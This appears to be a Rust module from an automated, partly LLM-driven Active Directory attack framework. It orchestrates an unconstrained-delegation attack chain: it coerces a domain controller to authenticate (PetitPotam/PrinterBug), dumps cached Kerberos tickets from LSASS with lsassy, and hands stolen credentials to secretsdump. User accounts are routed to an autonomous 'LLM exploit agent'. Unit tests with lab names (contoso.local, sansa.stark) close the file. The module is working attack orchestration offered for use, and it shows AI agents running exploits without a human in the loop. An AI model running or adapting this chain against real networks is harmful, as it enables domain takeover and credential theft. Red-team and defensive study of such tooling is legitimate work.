//! auto_unconstrained_exploitation -- coerce-and-dump for unconstrained delegation.
//!
//! When a machine account with unconstrained delegation is discovered (e.g.
//! `DC02$`), this automation orchestrates the full attack chain:
//!
//!   1. **Coerce** a DC to authenticate to the unconstrained delegation host
//!      (PetitPotam / PrinterBug). The DC's TGT is cached in LSASS on that host.
//!   2. **Dump** cached TGTs from the host's LSASS memory via lsassy.
//!   3. **Chain** — result_processing's `auto_chain_s4u_secretsdump` picks up any
//!      `.ccache` ticket and dispatches secretsdump automatically.
//!
//! User accounts with unconstrained delegation (e.g. `sarah.connor`) are left to
//! the LLM-driven exploit path since we can't determine the target host.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tokio::time::Instant;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::DEDUP_COERCED_DCS;

/// Delay after coercion before dispatching the first TGT dump, giving the
/// coerced authentication time to complete and the TGT to land in LSASS.
const COERCE_TO_DUMP_DELAY: Duration = Duration::from_secs(15);

/// Maximum TGT dump attempts per vulnerability before giving up.
const MAX_DUMP_ATTEMPTS: u32 = 3;

/// Delay between successive dump retries for the same vuln.
const DUMP_RETRY_DELAY: Duration = Duration::from_secs(60);

// -----------------------------------------------------------------------
// Phase tracking (in-memory only — intentionally not persisted so restarts
// re-trigger the chain, since cached TGTs expire quickly).
// -----------------------------------------------------------------------

#[derive(Debug)]
struct PhaseState {
    coercion_dispatched_at: Option<Instant>,
    dump_attempts: u32,
    last_dump_at: Option<Instant>,
    completed: bool,
}

/// Monitors for unconstrained delegation vulns and orchestrates coerce → dump.
/// Interval: 20s. Wakes on delegation_notify and credential_access_notify.
pub async fn auto_unconstrained_exploitation(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let deleg_notify = dispatcher.delegation_notify.clone();
    let cred_notify = dispatcher.credential_access_notify.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(20));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    let mut phases: HashMap<String, PhaseState> = HashMap::new();

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = deleg_notify.notified() => {},
            _ = cred_notify.notified() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<UnconstrainedWork> = {
            let state = dispatcher.state.read().await;

            // Skip only when ALL forests are dominated AND strategy says to stop.
            // When continue_after_da is true, keep exploiting unconstrained
            // delegation for path diversity even after full domination.
            if state.has_domain_admin
                && state.all_forests_dominated()
                && !dispatcher.config.strategy.should_continue_after_da()
            {
                continue;
            }

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    if vuln.vuln_type.to_lowercase() != "unconstrained_delegation" {
                        return None;
                    }
                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    let account_name = vuln
                        .details
                        .get("account_name")
                        .and_then(|v| v.as_str())?
                        .to_string();

                    let domain = vuln
                        .details
                        .get("domain")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();

                    // Skip completed vulns
                    if phases.get(&vuln.vuln_id).is_some_and(|p| p.completed) {
                        return None;
                    }

                    // Machine accounts: resolve hostname → IP for coerce+dump chain.
                    // User accounts (sansa.stark): dispatch LLM exploit task since we
                    // can't determine which host to coerce from just the account name.
                    let is_machine = account_name.ends_with('$');

                    // Find a DC in the same domain — this is what we coerce FROM.
                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    let host_ip = if is_machine {
                        let hostname_prefix = account_name.trim_end_matches('$').to_lowercase();
                        state.hosts.iter().find_map(|h| {
                            let h_lower = h.hostname.to_lowercase();
                            if h_lower == hostname_prefix
                                || h_lower.starts_with(&format!("{hostname_prefix}."))
                            {
                                Some(h.ip.clone())
                            } else {
                                None
                            }
                        })?
                    } else {
                        // For user accounts, use the DC IP as the target — the LLM
                        // exploit agent will determine the right approach (e.g. find
                        // where the user is logged in, or use S4U).
                        dc_ip.as_ref().cloned()?
                    };

                    // Find any non-quarantined credential with a password for this domain.
                    let credential = state
                        .credentials
                        .iter()
                        .find(|c| {
                            !c.password.is_empty()
                                && c.domain.to_lowercase() == domain.to_lowercase()
                                && !state.is_credential_quarantined(&c.username, &c.domain)
                        })
                        .cloned();

                    if credential.is_none() {
                        debug!(
                            vuln_id = %vuln.vuln_id,
                            "Unconstrained: no credential available yet"
                        );
                        return None;
                    }

                    // User accounts go straight to LLM exploit (one-shot, no coerce+dump).
                    if !is_machine {
                        let dedup_key = format!("uc_user:{}", account_name.to_lowercase());
                        if phases.get(&vuln.vuln_id).is_some_and(|p| p.completed) {
                            return None;
                        }
                        return Some(UnconstrainedWork {
                            vuln_id: vuln.vuln_id.clone(),
                            account_name,
                            domain,
                            host_ip,
                            dc_ip,
                            credential,
                            action: Action::LlmExploit,
                            _dedup_key: Some(dedup_key),
                        });
                    }

                    // Determine action based on current phase (machine accounts only).
                    let phase = phases.get(&vuln.vuln_id);

                    // If auto_coercion already coerced this DC, skip straight to dump.
                    let already_coerced = dc_ip
                        .as_ref()
                        .is_some_and(|ip| state.is_processed(DEDUP_COERCED_DCS, ip));

                    let action = match phase {
                        // No phase yet — dispatch coercion (or skip if already coerced).
                        None if already_coerced => Action::Dump,
                        None if dc_ip.is_some() => Action::Coerce,
                        None => {
                            debug!(
                                vuln_id = %vuln.vuln_id,
                                "Unconstrained: no DC found for coercion"
                            );
                            return None;
                        }

                        // Coercion dispatched, waiting for delay before dump.
                        Some(p)
                            if p.coercion_dispatched_at.is_some()
                                && p.dump_attempts == 0
                                && p.coercion_dispatched_at.unwrap().elapsed()
                                    >= COERCE_TO_DUMP_DELAY =>
                        {
                            Action::Dump
                        }

                        // Dump retry — previous attempt didn't yield TGTs.
                        Some(p)
                            if p.dump_attempts > 0
                                && p.dump_attempts < MAX_DUMP_ATTEMPTS
                                && p.last_dump_at
                                    .is_none_or(|t| t.elapsed() >= DUMP_RETRY_DELAY) =>
                        {
                            Action::Dump
                        }

                        _ => return None,
                    };

                    Some(UnconstrainedWork {
                        vuln_id: vuln.vuln_id.clone(),
                        account_name,
                        domain,
                        host_ip,
                        dc_ip,
                        credential,
                        action,
                        _dedup_key: None,
                    })
                })
                .collect()
        };

        for item in work {
            match item.action {
                Action::Coerce => {
                    let dc_ip = match &item.dc_ip {
                        Some(ip) => ip.clone(),
                        None => continue,
                    };

                    let cred = match &item.credential {
                        Some(c) => c,
                        None => continue,
                    };

                    // Coerce DC → unconstrained host. The DC's TGT is cached
                    // in the unconstrained host's LSASS.
                    let payload = json!({
                        "target_ip": dc_ip,
                        "listener_ip": item.host_ip,
                        "techniques": ["petitpotam", "printerbug"],
                        "credential": {
                            "username": cred.username,
                            "password": cred.password,
                            "domain": cred.domain,
                        },
                        "reason": "unconstrained_delegation_coercion",
                    });

                    let priority = dispatcher.effective_priority("unconstrained_delegation");
                    match dispatcher
                        .throttled_submit("coercion", "coercion", payload, priority)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                account = %item.account_name,
                                dc = %dc_ip,
                                listener = %item.host_ip,
                                "Unconstrained delegation: coercion dispatched (DC → host)"
                            );
                            phases.insert(
                                item.vuln_id.clone(),
                                PhaseState {
                                    coercion_dispatched_at: Some(Instant::now()),
                                    dump_attempts: 0,
                                    last_dump_at: None,
                                    completed: false,
                                },
                            );
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "Coercion deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch unconstrained coercion"
                            );
                        }
                    }
                }

                Action::Dump => {
                    let cred = match &item.credential {
                        Some(c) => c,
                        None => continue,
                    };

                    let payload = json!({
                        "technique": "unconstrained_tgt_dump",
                        "vuln_type": "unconstrained_delegation",
                        "vuln_id": item.vuln_id,
                        "target": item.host_ip,
                        "target_ip": item.host_ip,
                        "domain": item.domain,
                        "account_name": item.account_name,
                        "credential": {
                            "username": cred.username,
                            "password": cred.password,
                            "domain": cred.domain,
                        },
                    });

                    let priority = dispatcher.effective_priority("unconstrained_delegation");
                    match dispatcher
                        .throttled_submit("exploit", "privesc", payload, priority)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            let phase = phases.entry(item.vuln_id.clone()).or_insert(PhaseState {
                                coercion_dispatched_at: None,
                                dump_attempts: 0,
                                last_dump_at: None,
                                completed: false,
                            });
                            phase.dump_attempts += 1;
                            phase.last_dump_at = Some(Instant::now());

                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                attempt = phase.dump_attempts,
                                target = %item.host_ip,
                                "Unconstrained delegation: TGT dump dispatched"
                            );

                            if phase.dump_attempts >= MAX_DUMP_ATTEMPTS {
                                phase.completed = true;
                                debug!(
                                    vuln_id = %item.vuln_id,
                                    "Unconstrained delegation: max dump attempts reached"
                                );
                            }
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "TGT dump deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch TGT dump"
                            );
                        }
                    }
                }

                Action::LlmExploit => {
                    // User-account unconstrained delegation — dispatch to LLM
                    // exploit agent which can determine the right approach
                    // (find where user is logged in, monitor for TGTs, etc.)
                    let cred = match &item.credential {
                        Some(c) => c,
                        None => continue,
                    };

                    let payload = json!({
                        "technique": "unconstrained_delegation_exploit",
                        "vuln_type": "unconstrained_delegation",
                        "vuln_id": item.vuln_id,
                        "target": item.host_ip,
                        "target_ip": item.host_ip,
                        "domain": item.domain,
                        "account_name": item.account_name,
                        "is_user_account": true,
                        "credential": {
                            "username": cred.username,
                            "password": cred.password,
                            "domain": cred.domain,
                        },
                    });

                    let priority = dispatcher.effective_priority("unconstrained_delegation");
                    match dispatcher
                        .throttled_submit("exploit", "privesc", payload, priority)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                account = %item.account_name,
                                "Unconstrained delegation: LLM exploit dispatched (user account)"
                            );
                            phases.insert(
                                item.vuln_id.clone(),
                                PhaseState {
                                    coercion_dispatched_at: None,
                                    dump_attempts: 0,
                                    last_dump_at: None,
                                    completed: true,
                                },
                            );
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "LLM exploit deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch unconstrained LLM exploit"
                            );
                        }
                    }
                }
            }
        }
    }
}

#[derive(Debug)]
enum Action {
    Coerce,
    Dump,
    /// Dispatch to LLM exploit agent (for user accounts).
    LlmExploit,
}

struct UnconstrainedWork {
    vuln_id: String,
    account_name: String,
    domain: String,
    host_ip: String,
    dc_ip: Option<String>,
    credential: Option<ares_core::models::Credential>,
    action: Action,
    _dedup_key: Option<String>,
}

#[cfg(test)]
mod tests {
    #[test]
    fn test_hostname_resolution_machine_account() {
        // DC02$ → "dc02"
        let account = "DC02$";
        let prefix = account.trim_end_matches('$').to_lowercase();
        assert_eq!(prefix, "dc02");

        // Should match "dc02.child.contoso.local"
        let hostname = "dc02.child.contoso.local";
        let h_lower = hostname.to_lowercase();
        assert!(h_lower == prefix || h_lower.starts_with(&format!("{prefix}.")));
    }

    #[test]
    fn test_hostname_resolution_short_name() {
        let account = "DC01$";
        let prefix = account.trim_end_matches('$').to_lowercase();
        assert_eq!(prefix, "dc01");

        // Should match "dc01"
        assert!("dc01" == prefix);
        // Should match "dc01.contoso.local"
        assert!("dc01.contoso.local".starts_with(&format!("{prefix}.")));
        // Should NOT match "dc011.contoso.local"
        assert!(!"dc011.contoso.local".starts_with(&format!("{prefix}.")));
    }

    #[test]
    fn test_is_machine_account() {
        assert!("DC02$".ends_with('$'));
        assert!("KINGSLANDING$".ends_with('$'));
        assert!(!"sansa.stark".ends_with('$'));
        assert!(!"Administrator".ends_with('$'));
    }

    #[test]
    fn test_user_account_gets_dc_ip_as_target() {
        // User accounts (no $) should use DC IP as target
        let account = "sansa.stark";
        let is_machine = account.ends_with('$');
        assert!(!is_machine);
        // In the real code, user accounts fall through to using dc_ip as host_ip
    }

    #[test]
    fn test_dedup_key_format_user_account() {
        let account = "sansa.stark";
        let dedup_key = format!("uc_user:{}", account.to_lowercase());
        assert_eq!(dedup_key, "uc_user:sansa.stark");
    }

    #[test]
    fn test_phase_state_defaults() {
        use super::PhaseState;
        let phase = PhaseState {
            coercion_dispatched_at: None,
            dump_attempts: 0,
            last_dump_at: None,
            completed: false,
        };
        assert!(!phase.completed);
        assert_eq!(phase.dump_attempts, 0);
        assert!(phase.coercion_dispatched_at.is_none());
    }

    #[test]
    fn test_max_dump_attempts_constant() {
        assert_eq!(super::MAX_DUMP_ATTEMPTS, 3);
    }

    #[test]
    fn test_coerce_to_dump_delay() {
        assert_eq!(
            super::COERCE_TO_DUMP_DELAY,
            std::time::Duration::from_secs(15)
        );
    }

    #[test]
    fn test_dump_retry_delay() {
        assert_eq!(super::DUMP_RETRY_DELAY, std::time::Duration::from_secs(60));
    }
}
